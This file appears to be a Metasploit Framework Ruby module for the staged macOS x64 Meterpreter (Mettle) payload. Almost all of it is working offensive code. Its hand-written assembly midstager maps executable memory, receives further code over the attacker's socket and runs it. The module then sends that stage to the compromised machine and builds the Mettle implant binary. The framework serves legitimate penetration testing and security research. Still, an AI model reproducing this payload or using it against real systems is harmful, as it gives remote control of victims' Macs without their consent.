##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/base/sessions/meterpreter_x64_osx'
require 'msf/base/sessions/meterpreter_options'
require 'msf/base/sessions/mettle_config'
require 'macho'

module MetasploitModule
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'OSX Meterpreter',
      'Description'   => 'Inject the mettle server payload (staged)',
      'Platform'      => 'osx',
      'Author'        => [
        'parchedmind',  # osx_runbin
        'nologic',      # shellcc
        'timwr',        # metasploit integration
        ],
      'References'    => [
          [ 'URL', 'https://github.com/CylanceVulnResearch/osx_runbin' ],
          [ 'URL', 'https://github.com/nologic/shellcc' ]
        ],
      'Arch'         => ARCH_X64,
      'License'      => MSF_LICENSE,
      'Session'      => Msf::Sessions::Meterpreter_x64_OSX,
      'Convention'   => 'sockedi',
      )
    )
  end

  def handle_intermediate_stage(conn, payload)
    stager_file = File.join(Msf::Config.data_directory, "meterpreter", "x64_osx_stage")
    data = File.binread(stager_file)
    macho = MachO::MachOFile.new_from_bin(data)
    main_func = macho[:LC_MAIN].first
    entry_offset = main_func.entryoff

    output_data = ''
    for segment in macho.segments
      for section in segment.sections
        file_section = segment.fileoff + section.offset
        vm_addr = section.addr - 0x100000000
        section_data = data[file_section, section.size]
        if output_data.size < vm_addr
          output_data += "\x00" * (vm_addr - output_data.size)
        end
        if section_data
          output_data[vm_addr, output_data.size] = section_data
        end
      end
    end

    midstager_asm = %(
      push rdi                    ; save sockfd
      xor rdi, rdi                ; address
      mov rsi, #{output_data.length}  ; length
      mov rdx, 0x7                ; PROT_READ | PROT_WRITE | PROT_EXECUTE
      mov r10, 0x1002             ; MAP_PRIVATE | MAP_ANONYMOUS
      xor r8, r8                  ; fd
      xor r9, r9                  ; offset
      mov eax, 0x20000c5          ; mmap
      syscall

      mov r12, rax

      mov rdx, rsi                ; length
      mov rsi, rax                ; address
      pop rdi                     ; sockfd
      mov r10, 0x40               ; MSG_WAITALL
      xor r8, r8                  ; srcaddr
      xor r9, r9                  ; addrlen
      mov eax, 0x200001d          ; recvfrom
      syscall

      push rdi                    ; save sockfd
      xor rdi, rdi                ; address
      mov rsi, #{payload.length}  ; length
      mov rdx, 0x7                ; PROT_READ | PROT_WRITE | PROT_EXECUTE
      mov r10, 0x1002             ; MAP_PRIVATE | MAP_ANONYMOUS
      xor r8, r8                  ; fd
      xor r9, r9                  ; offset
      mov eax, 0x20000c5          ; mmap
      syscall

      mov rdx, rsi                ; length
      mov rsi, rax                ; address
      pop rdi                     ; sockfd
      mov r10, 0x40               ; MSG_WAITALL
      xor r8, r8                  ; srcaddr
      xor r9, r9                  ; addrlen
      mov eax, 0x200001d          ; recvfrom
      syscall

      mov r10, rsi

      ; setup stack?
      and rsp, -0x10              ; Align
      add sp, 0x40                ; Add room for initial stack and prog name
      mov rax, 109                ; prog name "m"
      push 0                      ;
      mov rcx, rsp                ; save the stack
      push 0
      push 0
      push 0
      push 0
      push 0
      push 0
      push rdi                    ; ARGV[1] int sockfd
      push rcx                    ; ARGV[0] char *prog_name
      mov rax, 2                  ; ARGC
      push rax

      mov rsi, r12
      mov r12, rdx

      mov rax, #{entry_offset}
      add rsi, rax
      call rsi

      ; exit
      mov eax, 0x2000001
      mov rdi, 0x1
      syscall
    )
    midstager = Metasm::Shellcode.assemble(Metasm::X64.new, midstager_asm).encode_string
    print_status("Transmitting first stager...(#{midstager.length} bytes)")

    conn.put(midstager) == midstager.length
    print_status("Transmitting second stager...(#{output_data.length} bytes)")
    conn.put(output_data) == output_data.length
  end

  def generate_stage(opts = {})
    mettle_macho = MetasploitPayloads::Mettle.new('x86_64-apple-darwin',
      generate_config(opts.merge({scheme: 'tcp'}))).to_binary :exec
    mettle_macho[0] = 'b'
    mettle_macho
  end
end
